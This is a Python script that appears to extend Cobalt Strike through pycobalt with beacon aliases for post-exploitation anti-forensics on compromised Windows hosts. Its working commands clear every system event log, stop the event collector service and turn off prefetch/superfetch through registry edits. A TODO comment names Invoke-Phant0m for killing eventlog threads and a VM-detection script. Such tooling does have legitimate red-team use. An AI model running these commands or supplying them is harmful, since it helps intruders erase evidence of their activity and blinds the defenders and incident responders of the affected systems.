#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks

@aliases.alias('clear-logs', 'Clear system event logs')
def _(bid):
    aggressor.bpowerpick(bid, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog")

@aliases.alias('stop-events', 'Stop wecsvc')
def _(bid):
    aggressor.bshell(bid, "sc stop wecsvc")

@aliases.alias('disable-prefetch', 'Disable prefetch and superfetch')
def _(bid):
    command = r"""
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "0"
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "0"
"""
    aggressor.bpowerpick(bid, command)

@aliases.alias('enable-prefetch', 'Enable prefetch and superfetch')
def _(bid):
    command = r"""
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "3"
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "1"
"""
    aggressor.bpowerpick(bid, command)

# TODO
# 					bpowershell_import($1, script_resource("AntiForensicsKit/scripts/Invoke-Phant0m.ps1"));
# 					bpowershell($1, "Invoke-Phant0m -processname eventlog -threadfilter evt");
# 					bpowershell_import($1, script_resource("AntiForensicsKit/scripts/Check-VM.ps1"));
# 					bpowershell($1, "Check-VM");

